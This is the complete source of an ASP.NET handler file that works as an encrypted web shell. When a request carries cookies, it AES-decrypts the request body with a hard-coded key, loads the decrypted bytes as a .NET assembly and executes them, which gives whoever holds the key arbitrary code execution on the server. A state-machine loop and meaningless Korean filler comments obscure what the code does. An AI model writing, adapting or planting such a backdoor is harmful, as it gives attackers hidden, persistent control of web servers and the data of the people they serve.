<%@ WebHandler Language="C#" Class="F" %>
using System.Web;
using System.Text;
using System.Security.Cryptography;
using System.Reflection;
using System;

public class F:IHttpHandler
{
    public void ProcessRequest(HttpContext ctx)
    {
        // 오늘 날씨가 좋네요
        if (ctx.Request.Cookies.Count == 0) return;

        int state = 0;
        byte[] key = null;
        byte[] data = null;
        ICryptoTransform decryptor = null;
        byte[] assemblyBytes = null;
        Assembly assembly = null;
        object instance = null;

        while (state < 6)
        {
            // 배고파요, 치킨 먹고 싶다
            switch (state)
            {
                case 0:
                    // 이 코드는 비밀입니다
                    string s = "Y2E2MzQ1NzUzOGI5YjFlMA==";
                    key = Encoding.Default.GetBytes(Encoding.Default.GetString(Convert.FromBase64String(s)));
                    state = 1;
                    break;
                case 1:
                    // 그냥 아무 말이나 쓰고 있어요
                    data = ctx.Request.BinaryRead(ctx.Request.ContentLength);
                    state = 2;
                    break;
                case 2:
                    // 정말로요
                    var provider = new RijndaelManaged();
                    decryptor = provider.CreateDecryptor(key, key);
                    state = 3;
                    break;
                case 3:
                    // 한국어 공부하세요
                    assemblyBytes = decryptor.TransformFinalBlock(data, 0, data.Length);
                    state = 4;
                    break;
                case 4:
                    // 안녕하세요
                    assembly = Assembly.Load(assemblyBytes);
                    instance = assembly.CreateInstance("K");
                    state = 5;
                    break;
                case 5:
                    // 감사합니다
                    instance.Equals(ctx);
                    state = 99; // End loop
                    break;
            }
        }
    }
    public bool IsReusable { get { return false; } }
}